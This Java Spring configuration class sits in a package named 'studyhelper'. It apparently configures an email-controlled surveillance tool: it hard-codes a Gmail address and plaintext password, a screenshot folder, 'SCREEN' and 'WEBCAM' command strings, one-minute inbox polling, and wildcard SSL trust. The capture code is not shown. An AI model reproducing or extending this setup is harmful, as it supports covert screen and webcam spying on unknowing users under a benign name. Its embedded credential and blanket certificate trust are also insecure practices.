package com.example.studyhelper.config;

import java.util.Properties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.mail.javamail.JavaMailSenderImpl;

@Configuration
public class Config {
    public static final String APP_EMAIL = "spytest488@gmail.com";
    public static final String APP_EMAIL_PASSWORD = "Spytest123456";
    public static final String FOLDER_PATH = "C:\\Users\\user\\Desktop\\screenshot\\";
    public static final String IMAGE_FORMAT = "jpg";
    public static final String TIME_FORMATTER = "yyyyMMdd hh mm ss";
    public static final String EMAIL_FOLDER_NAME = "INBOX";
    public static final String SCREEN_COMMAND = "SCREEN";
    public static final String WEBCAM_COMMAND = "WEBCAM";
    public static final long EMAIL_CHECKING_FREQUENCY = 60000;
    public static final String HOST = "smtp.gmail.com";
    public static final int PORT = 587;


    @Bean("properties")
    public Properties getProperties() {
        Properties properties = new Properties();
        properties.put("mail.store.protocol", "imaps");
        properties.put("mail.imaps.ssl.trust", "*");
        properties.put("mail.transport.protocol", "smtp");
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.debug", "true");
        properties.put("mail.smtp.ssl.trust", "smtp.gmail.com");
        return properties;
    }

    @Bean
    public JavaMailSender getJavaMailSender() {
        JavaMailSenderImpl mailSender = new JavaMailSenderImpl();
        mailSender.setHost(HOST);
        mailSender.setPort(PORT);
        mailSender.setUsername(APP_EMAIL);
        mailSender.setPassword(APP_EMAIL_PASSWORD);
        mailSender.setJavaMailProperties(getProperties());
        return mailSender;
    }
}
